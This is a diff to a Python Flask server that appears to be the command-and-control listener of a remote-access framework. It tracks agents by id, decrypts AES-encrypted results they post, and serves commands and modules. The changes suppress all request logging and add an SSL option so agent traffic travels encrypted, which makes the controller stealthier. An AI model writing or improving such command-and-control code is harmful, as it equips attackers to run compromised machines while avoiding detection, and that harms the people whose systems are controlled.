@@ -14,11 +14,12 @@ import threading
 
 from flask import *
 app = Flask(__name__)
-#app.logger.disabled = True
+app.logger.disabled = True
 
 import logging
 log = logging.getLogger('werkzeug')
-log.setLevel(logging.ERROR)
+log.disabled = True
+#log.setLevel(logging.ERROR)
 
 COUNT=0
 #reload(sys)
@@ -287,7 +288,7 @@ def command():
 def result():
     id= request.args.get('page')
     data = request.form['data']
-    #eprint id,data
+    #print id,data
     if AGENTS.get(id) != None and data != None:
         #data = data.decode('base64')
         data = decrypt(AESKey,data)
@@ -344,10 +345,17 @@ def modules():
 def main():
 
     try:
-        host=["192.168.1.8",PORT]
-        thread = threading.Thread(target=app.run, args=(host))
-        thread.daemon = True
-        thread.start()
+        if SSL==True:
+            host=[HOST,PORT]
+            cert = {"ssl_context": (CERT, KEY)}
+            thread = threading.Thread(target=app.run, args=(host), kwargs=cert)
+            thread.daemon = True
+            thread.start()
+        else:
+            host=[HOST,PORT]
+            thread = threading.Thread(target=app.run, args=(host))
+            thread.daemon = True
+            thread.start()
         #app.run(host='0.0.0.0',port=PORT)
     except KeyboardInterrupt:
         pass
